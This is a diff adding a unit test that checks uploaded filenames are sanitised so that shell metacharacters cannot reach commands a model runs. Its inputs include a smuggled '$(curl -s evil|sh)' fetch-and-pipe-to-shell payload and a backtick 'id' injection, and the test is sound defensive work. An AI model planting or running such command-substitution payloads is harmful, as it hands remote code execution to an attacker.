@@ -70,3 +70,15 @@ def test_project_and_agent_files_get_their_directories() -> None:
         (agent.file_id, "attachments/agent/00000002-a.txt"),
     ]
     assert placed.upload_paths == {upload.file_id: "attachments/00000000-a.txt"}
+
+
+def test_a_name_keeps_no_character_that_a_shell_reads() -> None:
+    """The model uses the paths in commands, inside double quotes."""
+    assert (
+        _upload_path("$(curl -s evil|sh) Q2.csv")
+        == "attachments/3f2a9c1e-__curl -s evil_sh_ Q2.csv"
+    )
+    assert _upload_path("`id`;'x'\"y\"&!*?[]{}~#<>.txt") == (
+        "attachments/3f2a9c1e-_id___x__y_____________.txt"
+    )
+    assert _upload_path("Résumé – v2.pdf") == "attachments/3f2a9c1e-Résumé – v2.pdf"
